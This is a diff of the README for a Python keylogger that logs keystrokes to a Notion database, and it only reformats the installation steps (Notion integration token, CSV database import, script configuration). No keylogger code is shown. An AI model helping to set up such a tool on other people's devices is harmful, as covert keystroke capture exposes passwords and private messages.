@@ -9,19 +9,19 @@ Python keylogger that saves logs in a Notion database. It's recommended to have 
 
 ## Installation
 
-:one: Install [Python version 3.9 or more](https://www.python.org/downloads/) and the requirements with `pip3 install -r requirements.txt`
+1. Install [Python version 3.9 or more](https://www.python.org/downloads/) and the requirements with `pip3 install -r requirements.txt`
 
-:two: Create a [Notion account.](https://www.notion.so/signup) Then, create an [internal integration](https://www.notion.so/my-integrations) and get the **Internal Integration Secret (secret token).**
+2. Create a [Notion account.](https://www.notion.so/signup) Then, create an [internal integration](https://www.notion.so/my-integrations) and get the **Internal Integration Secret (secret token).**
 
-:three: Create a Notion page and import the [CSV database file.](./database.csv) Then, add your integration as a connection and get the **database's URL or ID.**
+3. Create a Notion page and import the [CSV database file.](./database.csv) Then, add your integration as a connection and get the **database's URL or ID.**
 
-> :information_source: Detailed steps :two: and :three: explained by Notion [here.](https://developers.notion.com/docs/create-a-notion-integration)
+4. In the database, change the *Date* property type from *Text* to *Created time.* Sort the database by *Date* in descending order for better view. **(optional)**
 
-:four: **(optional):** In the database, change the *Date* property type from *Text* to *Created time.* Sort the database by *Date* in descending order for better view.
+5. Insert your **secret token** and the **database's URL or ID** in the [Python script.](./notion_klog.py#L9)
 
-> :warning: Do not modify more the database properties for the script to properly work. In case of changing them, script should be modified from [line 118](./notion_klog.py#L118) to [line 139.](./notion_klog.py#L139)
-
-:five: Insert your **secret token** and the **database's URL or ID** in the [Python script.](./notion_klog.py#L9)
+> :information_source: Detailed steps 2 and 3 explained by Notion [here.](https://developers.notion.com/docs/create-a-notion-integration)
+>
+> :warning: Do not modify the database properties (except the date one) for the script to properly work. In case of changing them, script should be modified from [line 118](./notion_klog.py#L118) to [line 139.](./notion_klog.py#L139)
 
 ## Usage
 
